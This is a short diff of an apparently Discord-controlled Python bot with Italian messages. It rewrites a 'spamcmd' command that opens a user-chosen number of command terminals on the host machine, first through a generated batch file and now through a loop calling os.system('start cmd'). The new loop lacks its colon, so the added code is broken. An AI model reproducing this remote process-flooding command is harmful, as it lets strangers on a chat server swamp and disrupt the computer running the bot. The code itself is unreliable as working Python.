@@ -86,16 +86,11 @@ async def cmdput(ctx,arg):
 
 @client.command()
 async def spamcmd(ctx,arg):
-    const = 0
-    stop = int(arg)
-    subprocess.getoutput('echo @echo off > Funny.bat')
-    while const <= stop:
-        subprocess.getoutput('echo start >> Funny.bat')
-        const += 1
     await ctx.channel.purge(limit=1)
     await ctx.send('Inizializzando apertura terminali...')
-    os.system('Funny.bat')
-    subprocess.getoutput('if exist Funny.bat del Funny.bat/q')
+    for i in range(0,int(arg))
+        os.system('start cmd')
+    await ctx.send(f"Sono stati aperti {arg} terminali")
 
 
 
